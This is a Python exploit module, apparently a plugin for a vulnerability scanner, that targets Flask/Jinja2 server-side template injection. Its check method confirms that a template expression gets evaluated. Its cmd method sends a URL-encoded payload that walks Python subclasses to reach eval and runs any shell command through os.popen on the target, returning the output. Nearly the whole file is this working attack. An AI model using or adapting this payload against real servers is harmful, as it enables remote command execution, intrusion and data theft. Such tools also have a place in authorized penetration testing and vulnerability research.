#!/usr/bin/env python3

from app.lib.request import request
from app.lib.common import get_capta, get_useragent

class Ssti_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'Falsk SSTI漏洞',
            'description': 'Falsk SSTI注入漏洞,可执行任意命令',
            'date': '',
            'exptype': 'check',
            'type': 'Inject'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.headers = {
            "User-Agent": get_useragent()
        }
        self.capta = get_capta()
        self.check_payload = '?name={{%s}}' %(self.capta)
    
    async def check(self):
        
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """

        try:
            check_req = await request.get(self.url + self.check_payload, headers = self.headers)
            if await check_req.text() == 'Hello %s' %(self.capta) and check_req.status == 200:
                return True
            
        except Exception as e:
            # print(e)
            pass
    
    async def cmd(self, cmd):
    
        """
        执行命令

        :param str cmd: 要执行的命令

        :return tuple result: 执行的结果
        """

        try:
            if self.check():
                cmd_payload = '''?name=%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22''' + cmd + '''%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D'''
                cmd_req = await request.get(self.url + cmd_payload, headers = self.headers)
                result = await cmd_req.text()
                result = result.replace('\n', '')
                return True, result
        except Exception as e:
            # print(e) 
            pass

if __name__ == '__main__':
    SSTI = Ssti_BaseVerify('http://192.168.30.242:8000')
    SSTI.check()
